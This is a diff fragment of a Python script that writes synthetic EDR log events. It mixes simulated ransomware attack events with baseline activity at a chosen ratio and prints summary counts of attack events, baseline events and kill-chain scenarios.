+    # total = attack / (1 - ratio)  →  baseline = total - attack
+    total_target  = int(attack_count / (1 - normal_ratio))
+    baseline_need = total_target - attack_count
+    _baseline_events(max(baseline_need, count), all_events)
+
+    # Sort and write
     all_events.sort(key=lambda x: x[0])
+    with open(output_path, "w") as f:
+        for ts, ev in all_events:
+            f.write(json.dumps(ev) + "\n")
 
-    with path.open("w", encoding="utf-8") as f:
-        for _, ev in all_events:
-            f.write(json.dumps(ev, separators=(",", ":")) + "\n")
-
-    print(f"  wrote {len(all_events)} EDR/ransomware events across "
-          f"{len(families)} scenario(s) -> {path.name}")
-    print(f"  families emulated: {', '.join(fam['name'] for fam in families)}")
+    total = len(all_events)
+    print(f"  wrote {total} EDR events -> {Path(output_path).name}")
+    print(f"  attack events:   {attack_count} ({attack_count/total*100:.0f}%)")
+    print(f"  baseline events: {total-attack_count} ({(total-attack_count)/total*100:.0f}%)")
+    print(f"  correlated kill-chains: {len(scenarios_used)}")
+    for s in scenarios_used:
+        print(f"    {s}")
